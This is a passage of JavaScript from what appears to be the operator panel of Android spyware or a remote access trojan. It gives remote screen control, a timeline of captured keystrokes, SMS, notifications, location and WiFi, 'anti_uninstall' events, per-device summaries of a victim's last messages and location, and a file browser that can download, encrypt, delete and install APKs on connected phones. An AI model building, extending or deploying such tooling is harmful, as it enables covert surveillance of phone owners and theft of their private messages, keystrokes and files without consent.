  document.querySelectorAll('#ctrl-fps-set button').forEach(x=>x.classList.remove('active'));
  b.classList.add('active');
  ctrlFps = parseInt(b.dataset.fps) || 3;
  if(ctrlActive){ startCtrlStream(); toast('FPS → ' + ctrlFps,'ok',1500); }
}));
function ctrlToggleZoom(){
  ctrlZoomed = !ctrlZoomed;
  const img = $('ctrl-img');
  img.style.transform = ctrlZoomed ? 'scale(1.5)' : 'scale(1)';
  document.getElementById('ctrl-zoom-btn').classList.toggle('primary', ctrlZoomed);
}
function ctrlReplayLast(){
  if(!ctrlLastAction){ toast('No action to replay','warn'); return; }
  ctrlLastAction();
}
async function ctrlScrollGesture(dir){
  if(!activeId || !ctrlSize.w) return;
  const cx = Math.floor(ctrlSize.w / 2);
  const cy = Math.floor(ctrlSize.h / 2);
  const d = Math.floor(Math.min(ctrlSize.w, ctrlSize.h) * 0.4);
  let x1, y1, x2, y2;
  if(dir === 'up'){    x1=cx; y1=cy+d; x2=cx; y2=cy-d; }
  if(dir === 'down'){  x1=cx; y1=cy-d; x2=cx; y2=cy+d; }
  if(dir === 'left'){  x1=cx+d; y1=cy; x2=cx-d; y2=cy; }
  if(dir === 'right'){ x1=cx-d; y1=cy; x2=cx+d; y2=cy; }
  ctrlLastAction = () => ctrlScrollGesture(dir);
  try{ await api('/api/screen/swipe', {x1, y1, x2, y2, ms: 400}); $('ctrl-status').textContent = '📜 scroll ' + dir; }
  catch(e){ $('ctrl-status').textContent = '✗ ' + e.message; }
}
document.addEventListener('keydown', async e => {
  if(currentTab !== 'control') return;
  if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
  if(!ctrlActive) return;
  const key = e.key;
  if(key === 'ArrowUp' || key === 'ArrowDown' || key === 'ArrowLeft' || key === 'ArrowRight'){
    e.preventDefault();
    const dir = {ArrowUp:'up', ArrowDown:'down', ArrowLeft:'left', ArrowRight:'right'}[key];
    await ctrlScrollGesture(dir); return;
  }
  if(key === 'Enter' || key === ' '){
    e.preventDefault();
    if(!ctrlSize.w) return;
    const x = Math.floor(ctrlSize.w/2), y = Math.floor(ctrlSize.h/2);
    ctrlLastAction = () => api('/api/screen/tap', {x, y});
    await api('/api/screen/tap', {x, y}); $('ctrl-status').textContent = '👆 tap center'; return;
  }
  if(key === 'Escape'){ e.preventDefault(); await ctrlAction('back'); return; }
  if(key === 'h' || key === 'H'){ e.preventDefault(); await ctrlAction('home'); return; }
  if(key === 'r' || key === 'R'){ e.preventDefault(); await ctrlAction('recents'); return; }
});
document.addEventListener('DOMContentLoaded', ()=>{
  const t = $('ctrl-text');
  if(t) t.addEventListener('keydown', e => { if(e.key === 'Enter'){ e.preventDefault(); ctrlSendText(); } });
});
(function bindCtrlPointer(){
  const img = $('ctrl-img');
  if(!img) return;
  let dragging = false, startPt = null, curPt = null;
  function getPos(e){
    const rect = img.getBoundingClientRect();
    if(rect.width === 0 || rect.height === 0) return null;
    const realW = ctrlSize.w || img.naturalWidth || rect.width;
    const realH = ctrlSize.h || img.naturalHeight || rect.height;
    const src = (e.touches && e.touches[0]) ? e.touches[0]
              : (e.changedTouches && e.changedTouches[0]) ? e.changedTouches[0] : e;
    const cx = src.clientX - rect.left;
    const cy = src.clientY - rect.top;
    return { localX: cx, localY: cy,
             x: Math.max(0, Math.round(cx * (realW / rect.width))),
             y: Math.max(0, Math.round(cy * (realH / rect.height))) };
  }
  function showDragLine(a, b){
    const ln = $('ctrl-drag-line');
    if(!ln) return;
    const dx = b.localX - a.localX, dy = b.localY - a.localY;
    const len = Math.sqrt(dx*dx + dy*dy);
    const ang = Math.atan2(dy, dx);
    ln.style.left = a.localX + 'px'; ln.style.top = a.localY + 'px';
    ln.style.width = len + 'px'; ln.style.transform = 'rotate(' + ang + 'rad)'; ln.style.opacity = '0.7';
  }
  function hideDragLine(){ const ln = $('ctrl-drag-line'); if(ln) ln.style.opacity = '0'; }
  function onDown(e){ if(!ctrlActive || annotMode) return; const p = getPos(e); if(!p) return; startPt = p; curPt = p; dragging = true; showCtrlMarker(p.localX, p.localY); if(e.cancelable) e.preventDefault(); }
  function onMove(e){ if(!dragging) return; const p = getPos(e); if(!p) return; curPt = p; showCtrlMarker(p.localX, p.localY); showDragLine(startPt, p); if(e.cancelable) e.preventDefault(); }
  async function onUp(e){
    if(!dragging) return; dragging = false;
    const p = startPt, q = curPt; startPt = null; curPt = null; hideDragLine();
    if(!p || !q) return;
    const dx = q.localX - p.localX, dy = q.localY - p.localY;
    const dist = Math.sqrt(dx*dx + dy*dy);
    try{
      if(ctrlMode === 'tap'){
        if(dist > 12){
          const ms = Math.max(150, Math.min(900, Math.round(dist * 2.5)));
          ctrlLastAction = () => api('/api/screen/swipe', {x1:p.x, y1:p.y, x2:q.x, y2:q.y, ms});
          await api('/api/screen/swipe', {x1:p.x, y1:p.y, x2:q.x, y2:q.y, ms});
          $('ctrl-status').textContent = '👉 swipe ' + p.x + ',' + p.y + ' → ' + q.x + ',' + q.y + ' (' + ms + 'ms)';
        } else {
          ctrlLastAction = () => api('/api/screen/tap', {x:p.x, y:p.y});
          await api('/api/screen/tap', {x:p.x, y:p.y});
          $('ctrl-status').textContent = '👆 tap ' + p.x + ',' + p.y;
        }
      } else if(ctrlMode === 'scroll'){
        const ms = Math.max(120, Math.min(600, Math.round(dist * 2)));
        ctrlLastAction = () => api('/api/screen/swipe', {x1:p.x, y1:p.y, x2:q.x, y2:q.y, ms});
        await api('/api/screen/swipe', {x1:p.x, y1:p.y, x2:q.x, y2:q.y, ms});
        $('ctrl-status').textContent = '📜 scroll (' + ms + 'ms)';
      } else if(ctrlMode === 'longpress'){
        ctrlLastAction = () => api('/api/screen/longpress', {x:p.x, y:p.y});
        await api('/api/screen/longpress', {x:p.x, y:p.y});
        $('ctrl-status').textContent = '⏱ longpress ' + p.x + ',' + p.y;
      } else if(ctrlMode === 'swipe'){
        if(dist < 12){
          ctrlLastAction = () => api('/api/screen/tap', {x:p.x, y:p.y});
          await api('/api/screen/tap', {x:p.x, y:p.y});
          $('ctrl-status').textContent = '👆 tap ' + p.x + ',' + p.y;
        } else {
          const ms = Math.max(150, Math.min(1000, Math.round(dist * 2.5)));
          ctrlLastAction = () => api('/api/screen/swipe', {x1:p.x, y1:p.y, x2:q.x, y2:q.y, ms});
          await api('/api/screen/swipe', {x1:p.x, y1:p.y, x2:q.x, y2:q.y, ms});
          $('ctrl-status').textContent = '👉 swipe (' + ms + 'ms)';
        }
      }
    }catch(err){ $('ctrl-status').textContent = '✗ ' + err.message; }
    if(e && e.cancelable) e.preventDefault();
  }
  img.addEventListener('mousedown', onDown);
  document.addEventListener('mousemove', onMove);
  document.addEventListener('mouseup', onUp);
  img.addEventListener('touchstart', onDown, {passive:false});
  document.addEventListener('touchmove', onMove, {passive:false});
  document.addEventListener('touchend', onUp);
  document.addEventListener('touchcancel', onUp);
})();
function showCtrlMarker(x, y){
  const m = $('ctrl-marker'); if(!m) return;
  m.style.left = x + 'px'; m.style.top = y + 'px'; m.style.opacity = '1';
  clearTimeout(m._t); m._t = setTimeout(()=>{ m.style.opacity = '0'; }, 400);
}
async function ctrlAction(what){
  if(!activeId){ toast('No client selected','err'); return; }
  ctrlLastAction = () => ctrlAction(what);
  const r = await api('/api/screen/action', {what});
  $('ctrl-status').textContent = r.output || r.error || what;
}
async function ctrlPressKey(code){
  if(!activeId){ toast('No client selected','err'); return; }
  try{ await api('/api/screen/key', {code}); $('ctrl-status').textContent = '⌨ key ' + code; }
  catch(e){ $('ctrl-status').textContent = '✗ ' + e.message; }
}
async function ctrlSendText(){
  const t = $('ctrl-text').value.trim(); if(!t) return;
  if(!activeId){ toast('No client selected','err'); return; }
  const r = await api('/api/screen/text', {text: t});
  $('ctrl-status').textContent = r.output || r.error || '?';
  if(!r.error){ $('ctrl-text').value = ''; ctrlPressKey(66); }
}
document.querySelectorAll('#ctrl-mode button').forEach(b=> b.addEventListener('click',()=>{
  document.querySelectorAll('#ctrl-mode button').forEach(x=>x.classList.remove('active'));
  b.classList.add('active'); ctrlMode = b.dataset.mode;
  const s = $('ctrl-status'); if(s) s.textContent = 'mode: ' + ctrlMode;
}));

// ═══ Annotator ═══
function annotToggle(){
  annotMode = !annotMode;
  const c = $('annot-canvas'), tb = $('annot-toolbar'), btn = $('annot-toggle');
  if(annotMode){ syncAnnotCanvas(); c.style.pointerEvents = 'auto'; tb.classList.add('show'); btn.classList.add('primary'); annotUndoStack = []; toast('Annotation mode ON','ok',2500); }
  else { c.style.pointerEvents = 'none'; tb.classList.remove('show'); btn.classList.remove('primary'); }
}
function syncAnnotCanvas(){
  const c = $('annot-canvas'), img = $('ctrl-img');
  const r = img.getBoundingClientRect();
  if(r.width === 0 || r.height === 0) return;
  const old = c.width && c.height ? c.toDataURL() : null;
  c.width = Math.round(r.width); c.height = Math.round(r.height);
  if(old){ const im = new Image(); im.onload = () => c.getContext('2d').drawImage(im, 0, 0, c.width, c.height); im.src = old; }
}
function annotSetTool(tool, btn){
  annotCurrentTool = tool;
  document.querySelectorAll('.annot-tool[data-tool]').forEach(b=>b.classList.remove('active'));
  if(btn) btn.classList.add('active');
}
function annotPushUndo(){
  const c = $('annot-canvas'); if(c.width === 0) return;
  try{ annotUndoStack.push(c.getContext('2d').getImageData(0,0,c.width,c.height)); if(annotUndoStack.length > 20) annotUndoStack.shift(); }catch(_){}
}
function annotUndo(){ const c = $('annot-canvas'); const last = annotUndoStack.pop(); if(last){ try{ c.getContext('2d').putImageData(last, 0, 0); }catch(_){} } }
function annotClear(){ const c = $('annot-canvas'); c.getContext('2d').clearRect(0, 0, c.width, c.height); annotUndoStack = []; }
function annotSave(){
  const img = $('ctrl-img'), canvas = $('annot-canvas');
  if(!img || !img.naturalWidth){ toast('No frame loaded','warn'); return; }
  try{
    const out = document.createElement('canvas');
    out.width = img.naturalWidth; out.height = img.naturalHeight;
    const ctx = out.getContext('2d');
    ctx.drawImage(img, 0, 0, out.width, out.height);
    if(canvas.width && canvas.height){ ctx.drawImage(canvas, 0, 0, out.width, out.height); }
    out.toBlob(blob=>{
      if(!blob){ toast('Save failed','err'); return; }
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      const stamp = new Date().toISOString().replace(/[:.]/g,'-').slice(0,19);
      a.href = url; a.download = 'annotated_' + stamp + '.png';
      document.body.appendChild(a); a.click(); a.remove();
      URL.revokeObjectURL(url);
      toast('Annotated PNG saved','ok');
      addLog('🖊 saved annotated screenshot','connect');
    }, 'image/png');
  }catch(e){ toast('Save failed: ' + e.message,'err'); }
}
(function bindAnnotPointer(){
  const canvas = $('annot-canvas'); if(!canvas) return;
  function getPos(e){
    const r = canvas.getBoundingClientRect();
    const src = (e.touches && e.touches[0]) ? e.touches[0] : (e.changedTouches && e.changedTouches[0]) ? e.changedTouches[0] : e;
    return { x: src.clientX - r.left, y: src.clientY - r.top };
  }
  function color(){ return $('annot-color').value || '#ff3b30'; }
  function size(){ return parseInt($('annot-size').value) || 3; }
  function onDown(e){
    if(!annotMode) return; e.preventDefault(); e.stopPropagation();
    annotPushUndo(); annotDrawing = true; annotStartPt = getPos(e); annotLastPt = annotStartPt;
    if(annotCurrentTool === 'text'){
      const txt = prompt('Text to add:', '');
      if(txt){ const ctx = canvas.getContext('2d'); ctx.fillStyle = color(); ctx.font = (size()*6 + 10) + 'px system-ui,sans-serif'; ctx.textBaseline = 'top'; ctx.fillText(txt, annotStartPt.x, annotStartPt.y); }
      annotDrawing = false; return;
    }
  }
  function onMove(e){
    if(!annotMode || !annotDrawing) return; e.preventDefault(); e.stopPropagation();
    const p = getPos(e); const ctx = canvas.getContext('2d');
    ctx.strokeStyle = color(); ctx.fillStyle = color(); ctx.lineWidth = size(); ctx.lineCap = 'round'; ctx.lineJoin = 'round';
    if(annotCurrentTool === 'pen'){ ctx.beginPath(); ctx.moveTo(annotLastPt.x, annotLastPt.y); ctx.lineTo(p.x, p.y); ctx.stroke(); annotLastPt = p; }
    else { const last = annotUndoStack[annotUndoStack.length-1]; if(last) ctx.putImageData(last, 0, 0); drawShape(ctx, annotStartPt, p); }
  }
  function onUp(e){
    if(!annotMode || !annotDrawing) return; e.preventDefault(); e.stopPropagation();
    annotDrawing = false;
    if(annotCurrentTool !== 'pen' && annotCurrentTool !== 'text' && annotLastPt){
      const ctx = canvas.getContext('2d'); const last = annotUndoStack[annotUndoStack.length-1]; if(last) ctx.putImageData(last, 0, 0); drawShape(ctx, annotStartPt, annotLastPt);
    }
    annotLastPt = null; annotStartPt = null;
  }
  function drawShape(ctx, a, b){
    if(!a || !b) return;
    ctx.strokeStyle = color(); ctx.fillStyle = color(); ctx.lineWidth = size(); ctx.lineCap = 'round';
    if(annotCurrentTool === 'line'){ ctx.beginPath(); ctx.moveTo(a.x,a.y); ctx.lineTo(b.x,b.y); ctx.stroke(); }
    else if(annotCurrentTool === 'rect'){ ctx.beginPath(); ctx.rect(a.x, a.y, b.x-a.x, b.y-a.y); ctx.stroke(); }
    else if(annotCurrentTool === 'arrow'){
      const headLen = Math.max(10, size() * 4); const ang = Math.atan2(b.y-a.y, b.x-a.x);
      ctx.beginPath(); ctx.moveTo(a.x, a.y); ctx.lineTo(b.x, b.y); ctx.stroke();
      ctx.beginPath(); ctx.moveTo(b.x, b.y); ctx.lineTo(b.x - headLen*Math.cos(ang - Math.PI/6), b.y - headLen*Math.sin(ang - Math.PI/6));
      ctx.moveTo(b.x, b.y); ctx.lineTo(b.x - headLen*Math.cos(ang + Math.PI/6), b.y - headLen*Math.sin(ang + Math.PI/6)); ctx.stroke();
    }
  }
  canvas.addEventListener('mousedown', onDown);
  window.addEventListener('mousemove', onMove, true);
  window.addEventListener('mouseup', onUp, true);
  canvas.addEventListener('touchstart', onDown, {passive:false});
  canvas.addEventListener('touchmove', onMove, {passive:false});
  canvas.addEventListener('touchend', onUp, {passive:false});
  canvas.addEventListener('touchcancel', onUp, {passive:false});
})();
document.addEventListener('mousedown', e => { if(annotMode && e.target && e.target.id === 'ctrl-img'){ e.stopPropagation(); } }, true);

// ═══ Notes/tags ═══
async function loadClientMeta(cid){
  if(!cid){ $('meta-display-name').value = ''; $('meta-notes').value = ''; metaTags = []; renderMetaTags(); return; }
  if(metaLoadedFor === cid) return;
  metaLoadedFor = cid;
  try{
    const r = await api('/api/client/meta?id=' + encodeURIComponent(cid));
    const m = (r && r.meta) || {};
    $('meta-display-name').value = m.display_name || '';
    $('meta-notes').value = m.notes || '';
    metaTags = Array.isArray(m.tags) ? [...m.tags] : [];
    renderMetaTags();
  }catch(e){ metaTags = []; renderMetaTags(); }
}
function renderMetaTags(){
  const box = $('meta-tags'); if(!box) return; box.innerHTML = '';
  metaTags.forEach((t, i)=>{
    const chip = document.createElement('span'); chip.className = 'tag-chip'; chip.innerHTML = esc(t) + '<span class="x">×</span>';
    chip.querySelector('.x').onclick = () => { metaTags.splice(i,1); renderMetaTags(); };
    box.appendChild(chip);
  });
}
async function saveClientMeta(){
  if(!activeId){ toast('No client selected','err'); return; }
  const payload = { id: activeId, display_name: $('meta-display-name').value.trim(), notes: $('meta-notes').value, tags: metaTags };
  try{
    const r = await api('/api/client/meta', payload);
    if(r.error){ toast(r.error,'err'); return; }
    toast('Saved','ok'); addLog('📝 saved notes/tags for ' + activeId,'connect');
    const s = await api('/api/state'); allClients = s.clients||[]; renderClients(allClients);
  }catch(e){ toast('Save failed: ' + e.message,'err'); }
}
$('meta-tag-input').addEventListener('keydown', e => {
  if(e.key !== 'Enter') return; e.preventDefault();
  const v = ($('meta-tag-input').value || '').trim(); if(!v) return;
  if(v.length > 32){ toast('Tag too long','warn'); return; }
  if(metaTags.includes(v)){ $('meta-tag-input').value = ''; return; }
  if(metaTags.length >= 20){ toast('Max 20 tags','warn'); return; }
  metaTags.push(v); $('meta-tag-input').value = ''; renderMetaTags();
});

// ═══ Session ═══
async function sessionStatus(){
  try{ const r = await api('/api/session/status'); sessionIsRecording = !!r.recording; updateRecUI(); }catch(_){}
}
function updateRecUI(){
  const ind1 = $('rec-indicator'), ind2 = $('rec-indicator2'), lbl = $('rec-label');
  const startBtn = $('rec-start'), stopBtn = $('rec-stop');
  if(sessionIsRecording){
    if(ind1){ ind1.classList.remove('off'); ind1.style.display = 'inline-flex'; }
    if(ind2) ind2.classList.remove('off');
    if(lbl) lbl.textContent = 'recording';
    if(startBtn) startBtn.style.display = 'none';
    if(stopBtn) stopBtn.style.display = 'inline-flex';
  } else {
    if(ind1){ ind1.classList.add('off'); ind1.style.display = 'none'; }
    if(ind2) ind2.classList.add('off');
    if(lbl) lbl.textContent = 'stopped';
    if(startBtn) startBtn.style.display = 'inline-flex';
    if(stopBtn) stopBtn.style.display = 'none';
  }
}
async function sessionStart(){
  const clearFirst = sessionEvents.length === 0 ? false : confirm('Start a NEW recording?\n\nOK = clear, Cancel = append.');
  const r = await api('/api/session/record', {on:true, clear:clearFirst});
  sessionIsRecording = !!r.recording;
  if(clearFirst) sessionEvents = [];
  updateRecUI(); renderSession();
  toast('Recording started' + (clearFirst ? ' (cleared)' : ''),'ok');
  addLog('🎬 session recording ON','connect');
}
async function sessionStop(){
  const r = await api('/api/session/record', {on:false});
  sessionIsRecording = !!r.recording; updateRecUI(); toast('Recording stopped','warn'); addLog('🎬 session recording OFF','info');
}
async function sessionClear(){ if(!confirm('Clear all session events?')) return; await api('/api/session/clear', {}); sessionEvents = []; renderSession(); toast('Cleared','ok'); }
function sessionExport(){ if(!sessionEvents.length){ toast('No events to export','warn'); return; } window.location.href = '/api/session/export'; toast('Downloading session JSON…','ok'); }
async function loadSessionEvents(){ try{ const r = await api('/api/session/events?since=0'); sessionEvents = r.events || []; sessionIsRecording = !!r.recording; updateRecUI(); renderSession(); }catch(_){} }
function fmtEventData(ev){
  const t = ev.type; const d = ev.data || {};
  if(t === 'keylog'){ try{ const inner = typeof d.data === 'string' ? JSON.parse(d.data) : d.data; if(inner) return '[' + (inner.pkg||'?') + '/' + (inner.cls||'') + '] ' + (inner.kind||'') + ': ' + (inner.key||''); }catch(_){} return JSON.stringify(d).slice(0,200); }
  if(t === 'notification'){ try{ const nd = typeof d.data === 'string' ? JSON.parse(d.data) : d.data; if(nd) return '[' + (nd.app||'?') + '] ' + (nd.title||'') + ' — ' + (nd.body||''); }catch(_){} return ''; }
  if(t === 'battery') return (d.level||'?') + '%' + (d.charging ? ' ⚡ charging' : '');
  if(t === 'sms') return (d.from||'?') + ': ' + (d.body||'').slice(0,140);
  if(t === 'location') return (d.lat||'?') + ',' + (d.lon||'?') + ' ±' + (d.acc||'?') + 'm';
  if(t === 'wifi_change') return '→ ' + (d.ssid||'?') + (d.prev ? ' (from ' + d.prev + ')' : '') + (d.lat ? ' @ ' + d.lat + ',' + d.lon : '');
  if(t === 'perm_state') return 'screen=' + (d.screen===null?'?':d.screen) + ' overlay=' + (d.overlay===null?'?':d.overlay) + (d.msg?' ('+d.msg+')':'');
  if(t === 'perm_req') return 'requested: ' + (d.what||'?');
  if(t === 'keylogger') return (d.status||'') + ': ' + (d.msg||'');
  if(t === 'notif_svc') return (d.status||'') + ': ' + (d.msg||'');
  if(t === 'notif_state') return 'forwarding=' + (d.forwarding?'ON':'OFF');
  if(t === 'app_launched') return (d.pkg||'?') + ' via ' + (d.how||'?');
  if(t === 'anti_uninstall') return (d.action||'') + (d.pkg?' ('+d.pkg+')':'');
  if(t === 'net_update') return '→ ' + (d.ip||'?') + ':' + (d.port||'?');
  if(t === 'client_connect') return (d.model||'?') + ' A' + (d.android||'?');
  if(t === 'client_disconnect') return 'remaining: ' + (d.remaining||0);
  if(t === 'screen_state') return 'screen ' + (d.state||'');
  return JSON.stringify(d).slice(0, 200);
}
function renderSession(){
  const box = $('session-timeline'); if(!box) return;
  const filterType = ($('session-filter-type').value || '');
  const filterQ = ($('session-filter-q').value || '').toLowerCase();
  let list = sessionEvents.slice();
  if(filterType) list = list.filter(e => e.type === filterType);
  if(filterQ) list = list.filter(e => fmtEventData(e).toLowerCase().includes(filterQ) || (e.client||'').toLowerCase().includes(filterQ));
  $('session-total').textContent = sessionEvents.length; $('session-shown').textContent = list.length;
  if(!list.length){
    box.innerHTML = '<div style="color:var(--text-mute);text-align:center;padding:40px">' + (sessionEvents.length ? 'No events match filter.' : 'Click "Start Recording" to begin capturing events.') + '</div>';
    return;
  }
  const html = list.map(e => {
    const d = new Date(e.ts * 1000);
    const hh = String(d.getHours()).padStart(2,'0');
    const mm = String(d.getMinutes()).padStart(2,'0');
    const ss = String(d.getSeconds()).padStart(2,'0');
    return '<div class="timeline-event" data-type="'+esc(e.type)+'">'
      + '<span class="t-ts">'+hh+':'+mm+':'+ss+'</span>'
      + '<span class="t-client">'+esc(e.client||'?')+'</span>'
      + '<span class="t-type">'+esc(e.type)+'</span>'
      + '<span class="t-data">'+esc(fmtEventData(e))+'</span></div>';
  }).join('');
  box.innerHTML = html; box.scrollTop = box.scrollHeight;
}

// ═══ Overview ═══
async function loadOverview(){
  const grid = $('overview-grid');
  if(grid && !overviewData.length) grid.innerHTML = '<div class="gallery-empty">Loading…</div>';
  try{ const r = await api('/api/clients/summary'); overviewData = r.clients || []; renderOverview(); }
  catch(e){ if(grid) grid.innerHTML = '<div class="gallery-empty">Failed: '+esc(e.message)+'</div>'; }
}
function renderOverview(){
  const grid = $('overview-grid'); if(!grid) return;
  const q = ($('ov-search').value||'').toLowerCase().trim();
  const onlyTagged = $('ov-only-tagged').checked;
  let list = overviewData.slice();
  if(onlyTagged) list = list.filter(c => (c.tags && c.tags.length) || c.notes || c.display_name);
  if(q){ list = list.filter(c => (c.id||'').toLowerCase().includes(q) || (c.model||'').toLowerCase().includes(q) || (c.display_name||'').toLowerCase().includes(q) || (c.notes||'').toLowerCase().includes(q) || (Array.isArray(c.tags) ? c.tags.join(' ') : '').toLowerCase().includes(q)); }
  if(!list.length){ grid.innerHTML = '<div class="gallery-empty">' + (overviewData.length ? 'No matches.' : 'No clients connected.') + '</div>'; return; }
  grid.innerHTML = list.map(c => {
    const label = c.display_name || c.id;
    const initial = (c.display_name || c.model || c.id || '?').charAt(0).toUpperCase();
    const tagsHtml = (Array.isArray(c.tags) && c.tags.length) ? '<div class="ov-tags">' + c.tags.map(t => '<span class="tag-chip">'+esc(t)+'</span>').join('') + '</div>' : '';
    const notesHtml = c.notes ? '<div class="ov-notes">📝 '+esc(c.notes.slice(0,120))+(c.notes.length>120?'…':'')+'</div>' : '';
    const batV = c.battery !== null && c.battery !== undefined ? c.battery + '%' : '—';
    const batClass = (c.battery !== null && c.battery < 20) ? 'bad' : (c.battery !== null && c.battery < 50) ? 'warn' : (c.battery !== null ? 'ok' : '');
    const smsV = c.last_sms ? (c.last_sms.from + ': ' + c.last_sms.body.slice(0,30)) : '—';
    const notifV = c.last_notif ? (c.last_notif.app + ': ' + (c.last_notif.title||c.last_notif.body||'').slice(0,30)) : '—';
    const locV = c.last_location ? (c.last_location.lat + ',' + c.last_location.lon) : '—';
    const wifiV = c.last_wifi ? (c.last_wifi.ssid || '?') : '—';
    const appV = c.last_app_launched ? c.last_app_launched.pkg : '—';
    const uptimeV = fmtDuration(c.secs);
    const reconnV = c.reconnect_count || 0;
    const screenBadge = (c.screen === false)
      ? '<span style="background:rgba(255,122,133,.25);color:var(--red);font-size:9.5px;padding:2px 8px;border-radius:10px;font-weight:700;margin-left:4px">📸 NO</span>'
      : (c.screen === true ? '<span style="background:rgba(110,231,165,.2);color:var(--green);font-size:9.5px;padding:2px 8px;border-radius:10px;font-weight:700;margin-left:4px">📸 OK</span>' : '');
    return '<div class="ov-card'+(c.active?' active':'')+'" onclick="selectClient(\''+esc(c.id).replace(/'/g,"\\'")+'\'); switchTab(\'dashboard\');">'
      + '<div class="ov-head">'
      +   '<div class="ov-avatar">'+esc(initial)+'</div>'
      +   '<div class="ov-info">'
      +     '<div class="ov-name">'+esc(label)+screenBadge+'</div>'
      +     '<div class="ov-sub">'+esc(c.model||'?')+' · A'+esc(c.android||'?')+' · '+esc(c.build||'')+'</div>'
      +   '</div>'
      +   (c.active ? '<span style="background:rgba(110,231,165,.2);color:var(--green);font-size:9.5px;padding:2px 8px;border-radius:10px;font-weight:700">ACTIVE</span>' : '')
      + '</div>'
      + '<div class="ov-stats">'
      +   '<div class="ov-stat"><div class="l">Battery</div><div class="v '+batClass+'">'+esc(batV)+'</div></div>'
      +   '<div class="ov-stat"><div class="l">Uptime</div><div class="v">'+esc(uptimeV)+'</div></div>'
      +   '<div class="ov-stat"><div class="l">Reconnects</div><div class="v">'+reconnV+'</div></div>'
      +   '<div class="ov-stat"><div class="l">Endpoint</div><div class="v">'+(c.ip?esc(c.ip)+':'+esc(c.port||''):'—')+'</div></div>'
      + '</div>'
      + '<div class="ov-stat" style="margin-top:8px"><div class="l">Last WiFi</div><div class="v">'+esc(wifiV)+'</div></div>'
      + '<div class="ov-stat" style="margin-top:6px"><div class="l">Last SMS</div><div class="v">'+esc(smsV.slice(0,60))+'</div></div>'
      + '<div class="ov-stat" style="margin-top:6px"><div class="l">Last Notif</div><div class="v">'+esc(notifV.slice(0,60))+'</div></div>'
      + '<div class="ov-stat" style="margin-top:6px"><div class="l">Last Location</div><div class="v">'+esc(locV)+'</div></div>'
      + '<div class="ov-stat" style="margin-top:6px"><div class="l">Last App</div><div class="v">'+esc(appV)+'</div></div>'
      + tagsHtml + notesHtml
      + '</div>';
  }).join('');
}

// ═══ Files ═══
function parseLs(text){
  if(!text || text==='(empty)' || text==='(no such path)' || text==='(not a directory)') return [];
  const out=[];
  for(const raw of text.split('\n')){
    const m=raw.match(/^([d\-])\s+(\d+)\s+(.+)$/);
    if(!m) continue;
    out.push({type:m[1]==='d'?'dir':'file', size:parseInt(m[2],10), name:m[3]});
  }
  return out;
}
async function fbRefresh(){
  if(!activeId){ $('fb-list').innerHTML='<div class="file-empty">select a client first</div>'; return; }
  $('fb-list').innerHTML='<div class="file-empty">loading…</div>';
  const r = await sendCmd('ls',[],{silent:true});
  if(r.error){ $('fb-list').innerHTML='<div class="file-empty">'+esc(r.error)+'</div>'; return; }
  renderFileList(parseLs(r.output||''));
}
function renderFileList(items){
  fbItems = items || [];
  const names = new Set(fbItems.map(x => x.name));
  for(const n of [...fbSelected]) if(!names.has(n)) fbSelected.delete(n);
  const list = $('fb-list'); list.innerHTML='';
  if(!fbItems.length){ list.innerHTML='<div class="file-empty">(empty)</div>'; updateBulkBar(); return; }
  fbItems.sort((a,b)=>{ if(a.type!==b.type) return a.type==='dir'?-1:1; return a.name.localeCompare(b.name); });
  for(const it of fbItems){
    const row = document.createElement('div');
    row.className = 'file-row selectable';
    if(fbSelected.has(it.name)) row.classList.add('selected');
    const checkWrap = document.createElement('div'); checkWrap.className = 'check';
    const cb = document.createElement('input'); cb.type = 'checkbox'; cb.className = 'file-cb'; cb.checked = fbSelected.has(it.name);
    cb.onclick = (e) => { e.stopPropagation(); toggleFbSelect(it.name); };
    checkWrap.appendChild(cb); row.appendChild(checkWrap);
    let icon = '📄'; if(it.type==='dir') icon = '📁'; else { const k = kindFromName(it.name); icon = iconForKind(k); }
    const ncls = it.type==='dir' ? 'name dir' : 'name';
    const sz = it.type==='dir' ? '—' : fmtSize(it.size);
    const iconEl = document.createElement('div'); iconEl.className='icon'; iconEl.textContent=icon;
    const nameEl = document.createElement('div'); nameEl.className=ncls; nameEl.textContent=it.name;
    const sizeEl = document.createElement('div'); sizeEl.className='size'; sizeEl.textContent=sz;
    const actsEl = document.createElement('div'); actsEl.className='acts';
    if(it.type==='dir'){ nameEl.onclick = () => fbEnter(it.name); }
    else {
      const dl = document.createElement('button'); dl.textContent='⬇'; dl.title='Download'; dl.onclick=()=>fbDownload(it.name); actsEl.appendChild(dl);
      if(it.name.endsWith('.enc')){
        const dec = document.createElement('button'); dec.textContent='🔓'; dec.title='Decrypt'; dec.onclick=()=>fbDecrypt(it.name); actsEl.appendChild(dec);
        if(it.name.endsWith('.zip.enc')){
          const uz = document.createElement('button'); uz.textContent='📂'; uz.title='Unzip'; uz.onclick=()=>fbUnzipDec(it.name); actsEl.appendChild(uz);
        }
      } else {
        const enc = document.createElement('button'); enc.textContent='🔒'; enc.title='Encrypt'; enc.onclick=()=>fbEncrypt(it.name); actsEl.appendChild(enc);
        const zp = document.createElement('button'); zp.textContent='🗜'; zp.title='Zip+Enc'; zp.onclick=()=>fbZipEnc(it.name); actsEl.appendChild(zp);
      }
      if(it.name.endsWith('.apk')){
        const ins = document.createElement('button'); ins.textContent='📦'; ins.title='Install'; ins.onclick=()=>fbInstall(it.name); actsEl.appendChild(ins);
      }
    }
    const del = document.createElement('button'); del.className='del'; del.textContent='🗑'; del.title='Delete'; del.onclick=()=>fbDelete(it.name, it.type); actsEl.appendChild(del);
    row.appendChild(iconEl); row.appendChild(nameEl); row.appendChild(sizeEl); row.appendChild(actsEl);
    list.appendChild(row);
  }
  updateBulkBar();
}
function toggleFbSelect(name){ if(fbSelected.has(name)) fbSelected.delete(name); else fbSelected.add(name); renderFileList(fbItems); }
function updateBulkBar(){ const bar = $('bulk-bar'), cnt = $('bulk-count'); if(!bar) return; if(fbSelected.size === 0){ bar.classList.remove('show'); return; } bar.classList.add('show'); cnt.textContent = fbSelected.size + ' selected'; }
function bulkSelectAll(){ for(const it of fbItems) fbSelected.add(it.name); renderFileList(fbItems); }
function bulkSelectNone(){ fbSelected.clear(); renderFileList(fbItems); }
function bulkInvert(){ const all = fbItems.map(x => x.name); for(const n of all){ if(fbSelected.has(n)) fbSelected.delete(n); else fbSelected.add(n); } renderFileList(fbItems); }
function bulkPaths(){ return [...fbSelected]; }
function bulkPw(){ return fbPw(); }
async function bulkDelete(){
  const paths = bulkPaths(); if(!paths.length) return;
